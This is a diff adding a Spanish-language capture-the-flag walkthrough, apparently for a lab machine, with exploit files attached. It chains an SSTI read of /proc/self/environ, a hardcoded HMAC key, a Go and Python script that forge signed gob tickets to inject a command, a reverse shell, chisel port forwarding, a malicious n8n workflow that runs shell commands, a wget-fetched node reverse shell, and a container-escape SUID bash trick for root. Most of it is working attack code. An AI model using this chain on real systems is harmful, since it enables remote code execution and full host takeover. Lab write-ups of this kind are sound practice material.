@@ -1,0 +1,169 @@
+* investiga la aplicacion hay un apartado que puedes leer archivos si colocas {{ .File "/proc/self/environ" }} en el apartado de comentarios y descargas el archivo
+
+* con eso puedes obtener el token con el que se firman los qr, pero la verdad no entendi bien com ose hace. de cualquier manera aqui estan los files para hacerlo
+
++++ Main.go +++
+package main
+
+import (
+    "bytes"
+    "encoding/gob"
+    "fmt"
+    "os"
+
+    mgob "gobtest/gob"
+)
+
+func main() {
+    gob.Register(&mgob.VerifyTicketAuthenticity{})
+
+    // Encode melalui interface agar wire format menyertakan
+    // type name "*gob.VerifyTicketAuthenticity", sama seperti server.
+    var v any = &mgob.VerifyTicketAuthenticity{Data: []byte(os.Args[1])}
+
+    var b bytes.Buffer
+    if err := gob.NewEncoder(&b).Encode(&v); err != nil {
+        panic(err)
+    }
+    fmt.Printf("%x", b.Bytes())
+}
++++ eof +++
+
++++ gob/gob.go +++
+
+package gob
+
+type VerifyTicketAuthenticity struct {
+    Data []byte
+}
+
++++ eof +++
+
++++ Exp.py +++
+import json
+import subprocess
+import base64
+import hmac
+import hashlib
+import sys
+import requests
+
+# HMAC key dari SSTI / systemd unit
+KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"
+
+# Ganti dengan tiketmu sendiri
+PNR = "J6PTPE"
+TOKEN = "cd70cbae9c6062f3c42b394898820d05"
+SEAT = "1A"
+PASSENGER = "Test User"
+
+CMD = sys.argv[1]
+
+obj = {
+    "PNR": PNR,
+    "Token": TOKEN,
+    "Seat": SEAT,
+    "Passenger": PASSENGER,
+    "NotifyCmd": CMD,
+}
+
+data = json.dumps(obj, separators=(",", ":"))
+
+# Encode gob dengan format yang sama seperti server
+gob_hex = subprocess.check_output(
+    ["/tmp/gobtest/enc/enc", data],
+    text=True,
+).strip()
+gob = bytes.fromhex(gob_hex)
+
+# HMAC-SHA256(key, gob_bytes)
+sig = hmac.new(KEY, gob, hashlib.sha256).digest()
+
+# base64(gob || sig)
+payload = base64.b64encode(gob + sig).decode()
+
+print(f"[*] gob bytes : {len(gob)}")
+print(f"[*] signature : {sig.hex()}")
+print(f"[*] payload   : {len(payload)} chars")
+
+print(f"{payload}")
++++ eof +++
+
+* como sea, ejecutando exp.py obtienes un token valido que puedes enviar al servidor. te pedira un CMD ejecuta el comando revshell y gana la revshell (Envialo en url encoded)
+
+* una vez con la revshell usa chisel para enviarte el puerto 5678 que es el puerto de n8n 
+
+* utiliza n8n-cli y la api-key que obtuviste con la lectura del envioroment para conectarte
+
+es necesario que registres un nuevo workflow malicioso
+
+
++++ evil.json +++
+{
+  "name": "BC",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "bc",
+        "options": {}
+      },
+      "id": "a1b2c3d4-1111-2222-3333-444455556666",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [460, 300],
+      "webhookId": "canary-webhook-001"
+    },
+    {
+      "parameters": {
+        "command": "id"
+      },
+      "id": "b2c3d4e5-2222-3333-4444-555566667777",
+      "name": "Execute Command",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [720, 300]
+    }
+  ],
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Execute Command",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "settings": {
+    "executionOrder": "v1"
+  }
+}
++++ eof +++ 
+
+* para explotarlo mas comodo usa el siguiente exploit (recuerda cambiar el id)
+
++++ n8n-exp.sh +++
+
+cat evil-wf.json | n8n-cli workflow update kWzckohQwR8JTjAT --stdin
+curl -X POST http://localhost:5678/webhook/bc
+ID=$(n8n-cli execution list | grep "id" | head -n 1 | tr '"' ' ' | awk '{print $3}')
+n8n-cli execution get "$ID"  --include-data
+
++++ eof +++
+
+* descaraga una revshell  de node (con wget por que curl no existe) 
+
+* investiga los montajes, te daras cuenta de que root de el contenedor esta enlazado al user de el host. es decir un authorized_keys ahi te dara acceso real al host
+
+* No cierres la terminal dentro del contenedor, la vas a necesitar para el escalado
+
+1- en el host: Copia "cp /usr/bin/bash rs" a /home/kpark
+2- el el docker: dale permisos suid a la bash copiada (chmod 4755 rs)
+3- en el host: ./rs -p
+
+* gana la rootflag
